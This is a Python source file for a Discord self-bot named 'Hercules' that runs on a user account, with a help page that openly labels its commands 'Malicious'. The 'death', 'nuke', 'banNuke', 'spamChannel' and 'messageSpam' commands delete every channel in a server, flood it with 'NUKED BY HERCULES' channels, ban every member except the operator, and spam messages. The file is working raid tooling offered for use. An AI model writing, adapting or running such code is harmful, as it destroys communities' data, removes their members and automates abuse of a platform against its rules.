import discord
from discord import *
from discord.ext import commands

import os
os.system("mode con lines=40")

title="""
 ██░ ██ ▓█████  ██▀███   ▄████▄   █    ██  ██▓    ▓█████   ██████ 
▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██▒    ▓█   ▀ ▒██    ▒ 
▒██▀▀██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▒██░    ▒███   ░ ▓██▄   
░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▒▓█  ▄   ▒   ██▒
░▓█▒░██▓░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██████▒░▒████▒▒██████▒▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░
 ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░
 ░  ░░ ░   ░     ░░   ░ ░         ░░░ ░ ░   ░ ░      ░   ░  ░  ░  
 ░  ░  ░   ░  ░   ░     ░ ░         ░         ░  ░   ░  ░      ░  
                        ░                                         
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#        
M a d e   b y   N o t S u e k
"""


# Setting up the bot
BOT_PREFIX = ">>>"
bot = commands.Bot(BOT_PREFIX, self_bot=True, case_insensitive=True)

# Removing the base help command
bot.remove_command("help")

# Runs when bot is ready
@bot.event
async def on_ready():
    print("Hercules ready ( ͡° ͜ʖ ͡°)")
    print(title)
    await bot.change_presence(activity=discord.Game(name='Hercules On Top'))

# Test command
@bot.command()
async def test(ctx, arg):
    await ctx.message.delete()
    await ctx.send(arg)

# Main help page
@bot.group(invoke_without_command=True)
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Help [Pages] | Hercules User Utility", description=f"Use {BOT_PREFIX}help <page name> for different pages.", color=0x00ff00)
    embed.add_field(name="Malicious [Must be lowercase]", value="Message spam, server nuker, ban nuker, spam channel, delete all channels.")
    embed.add_field(name="Testing [Must be lowercase]", value="Testing commands for the self-bot.")
    await ctx.send(embed=embed)

# Malicious help page
@help.command()
async def malicious(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Help [Malicious commands] | Hercules User Utility", description="Use .help <page name> for different pages.", color=0x00ff00)
    embed.add_field(name=f"{BOT_PREFIX}messageSpam <Message> <Amount sent>", value="Will spam <Message> <Amount sent> times in any channel.", inline=True)
    embed.add_field(name=f"{BOT_PREFIX}nuke <Amount of channels> <Channel name>", value="Will delete all channels and creat <Amount of channels> channels name <Channel name>.", inline=True)
    embed.add_field(name=f"{BOT_PREFIX}banNuke", value=f"Bans all members except {ctx.message.author}.", inline=True)
    embed.add_field(name=f"{BOT_PREFIX}spamChannel <Amount of channels> <Channel name>", value="Creates <Amount of channels> channels named <Channel name>.", inline=True)
    embed.add_field(name=f"{BOT_PREFIX}death", value="Deletes every. single. channel. in the server.", inline=True)
    await ctx.send(embed=embed)

# Testing help page
@help.command()
async def testing(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Help [Testing commands] | Hercules User Utility", description="Use .help <page name> for different pages.", color=0x00ff00)
    embed.add_field(name=f"{BOT_PREFIX}test <Message>", value="Will send <Message> in the channel used in.", inline=True)
    embed.add_field(name=f"{BOT_PREFIX}embed <title> <description> <option 1 title> <option 2 value> <embed color>", value="Creates a custom embed using the values entered.")
    await ctx.send(embed=embed)

# Delete all channels command
@bot.command()
async def death(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.delete()

# Spam creates channels command
@bot.command()
async def spamChannel(ctx, amount=5, name="NUKED BY HERCULES"):
    await ctx.message.delete()
    for x in range(amount):
        guild = ctx.guild
        channel = await guild.create_text_channel(name)

# Nuke server command
@bot.command()
async def nuke(ctx, amount=10, name="NUKED BY HERCULES"):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.delete()
    for x in range(amount):
        guild = ctx.guild
        channel = await guild.create_text_channel(name)

# Ban nuke command
@bot.command()
async def banNuke(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            print(user + "was banned by: HERCULES")
            await user.ban()
        except:
            pass

# Message spam command
@bot.command()
async def messageSpam(ctx, args="HERCULES ON TOP", amount=5):
    await ctx.message.delete()
    for x in range(amount):
        await ctx.send(args)

# Purge command
@bot.command()
async def purge(ctx, amount=5):
    await ctx.message.delete()
    channel = ctx.message.channel
    author = ctx.message.author
    amount += 1

    await channel.purge(limit=amount)
    await ctx.send(f"{amount} messages deleted by {author}.")

# Custom embed command
@bot.command()
async def embed(ctx, title="Missing title", description="Missing description", option1Title="Missing title", option1Value="Missing value", color=0x00ff00):
    await ctx.message.delete()
    embed = discord.Embed(title=title, description=description, color=color)
    embed.add_field(name=option1Title, value=option1Value, inline=False)
    await ctx.send(embed=embed)

# Running the bot
bot.run("token here", bot=False)
